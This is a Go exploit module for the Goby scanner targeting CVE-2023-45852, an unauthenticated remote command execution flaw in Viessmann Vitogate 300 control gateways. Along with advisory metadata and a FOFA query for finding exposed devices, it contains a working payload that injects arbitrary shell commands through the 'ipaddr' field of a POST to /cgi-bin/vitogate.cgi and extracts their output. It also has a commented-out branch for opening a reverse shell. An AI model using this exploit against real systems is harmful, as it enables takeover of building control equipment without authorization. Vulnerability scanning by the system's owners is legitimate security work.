package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Viessmann Vitogate/cgi bin/vitogate.cgi Api Remote Command Execution Vulnerability (CVE-2023-45852)",
    "Description": "<p>Viessmann Vitogate is an intelligent control system from Viessmann Company.</p><p>The issue in component/cgi bin/vitogate.cgi allows unauthenticated attackers to bypass authentication and execute arbitrary commands through carefully crafted requests.</p>",
    "Product": "Vitogate-300",
    "Homepage": "https://www.viessmann.cn",
    "DisclosureDate": "2023-10-14",
    "PostTime": "2023-11-02",
    "Author": "2737977997@qq.com",
    "FofaQuery": "body=\"handbook_vitogate\" || body=\"lang.dynamic('de','languages/de.json');\"",
    "GobyQuery": "body=\"handbook_vitogate\" || body=\"lang.dynamic('de','languages/de.json');\"",
    "Level": "3",
    "Impact": "<p>The issue in component/cgi bin/vitogate.cgi allows unauthenticated attackers to bypass authentication and execute arbitrary commands through carefully crafted requests.</p>",
    "Recommendation": "<p>The manufacturer has released a vulnerability fix patch, please keep an eye on the updates: <a href=\"https://connectivity.viessmann.com/gb/mp-fp/vitogate/vitogate-300-bn-mb.html\">https://connectivity.viessmann.com/gb/mp-fp/vitogate/vitogate-300-bn-mb.html</a></p>",
    "References": [
        "https://github.com/Push3AX/vul/blob/main/viessmann/Vitogate300_RCE.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2023-45852"
    ],
    "CNNVD": [
        "CNNVD-202310-1087"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Viessmann Vitogate /cgi-bin/vitogate.cgi 接口远程命令执行漏洞（CVE-2023-45852）",
            "Product": "Vitogate-300",
            "Description": "<p>Viessmann Vitogate是Viessmann公司的一个智能化控制系统。<br></p><p>Viessmann Vitogate 300 2.1.3.0版本存在安全漏洞，该漏洞源于允许未经身份验证的攻击者绕过身份验证，并通过 put 方法的 ipaddr 参数执行任意命令。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复补丁，请及时关注更新：<a href=\"https://connectivity.viessmann.com/gb/mp-fp/vitogate/vitogate-300-bn-mb.html\">https://connectivity.viessmann.com/gb/mp-fp/vitogate/vitogate-300-bn-mb.html</a></p>",
            "Impact": "<p>Viessmann Vitogate 300 2.1.3.0版本存在安全漏洞，该漏洞源于允许未经身份验证的攻击者绕过身份验证，并通过 put 方法的 ipaddr 参数执行任意命令。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Viessmann Vitogate/cgi bin/vitogate.cgi Api Remote Command Execution Vulnerability (CVE-2023-45852)",
            "Product": "Vitogate-300",
            "Description": "<p>Viessmann Vitogate is an intelligent control system from Viessmann Company.</p><p>The issue in component/cgi bin/vitogate.cgi allows unauthenticated attackers to bypass authentication and execute arbitrary commands through carefully crafted requests.</p>",
            "Recommendation": "<p>The manufacturer has released a vulnerability fix patch, please keep an eye on the updates: <a href=\"https://connectivity.viessmann.com/gb/mp-fp/vitogate/vitogate-300-bn-mb.html\">https://connectivity.viessmann.com/gb/mp-fp/vitogate/vitogate-300-bn-mb.html</a><br></p>",
            "Impact": "<p>The issue in component/cgi bin/vitogate.cgi allows unauthenticated attackers to bypass authentication and execute arbitrary commands through carefully crafted requests.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10874"
}`
	sendPayloadDAS3213 := func(hostInfo *httpclient.FixUrl, cmd string) (string, error) {
		RequestConfig := httpclient.NewPostRequestConfig("/cgi-bin/vitogate.cgi")
		RequestConfig.VerifyTls = false
		RequestConfig.FollowRedirect = false
		RequestConfig.Header.Store("Content-Type", "application/json")
		RequestConfig.Data = "{\"method\":\"put\",\"form\":\"form-4-8\",\"session\":\"\",\"params\":{\"ipaddr\":\"1;'" + strings.ReplaceAll(cmd, `"`, `\"`) + "'\"}}"
		resp, err := httpclient.DoHttpRequest(hostInfo, RequestConfig)
		if err == nil && resp.StatusCode == 200 {
			return resp.Utf8Html, err
		}
		return "", err
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			checkString := goutils.RandomHexString(6)
			resp, err := sendPayloadDAS3213(hostinfo, "echo "+checkString)
			return err ==nil && strings.Contains(resp, checkString) && len(resp) > 0
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "cmd" {
				cmd := goutils.B2S(stepLogs.Params["cmd"])
				if resp, err := sendPayloadDAS3213(expResult.HostInfo, cmd); len(resp) > 0 && err == nil { // 第四次请求
					if match := regexp.MustCompile(`Unknown host\s*(.*?)\\n"}`).FindStringSubmatch(resp); len(match) > 1 {
						expResult.Output = match[1]
						expResult.Success = true
					} else {
						expResult.Output = "漏洞利用失败！"
						expResult.Success = false
					}
					//} else if attackType == "shell_linux" {
					//	waitSessionCh := make(chan string)
					//	if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
					//		log.Println("[WARNING] godclient bind failed", err)
					//	} else {
					//		cmd := "nohup " + godclient.ReverseTCPBySh(rp) + " &"
					//		resp, _ := sendPayloadDAS3213(expResult.HostInfo, cmd)
					//		expResult.Output = resp
					//		select {
					//		case webConsleID := <-waitSessionCh:
					//			if u, err := url.Parse(webConsleID); err == nil {
					//				expResult.Success = true
					//				expResult.OutputType = "html"
					//				sid := strings.Join(u.Query()["id"], "")
					//				expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					//			}
					//		case <-time.After(time.Second * 10):
					//		}
					//	}
					//}
				}
			}
			return expResult
		},
	))
}
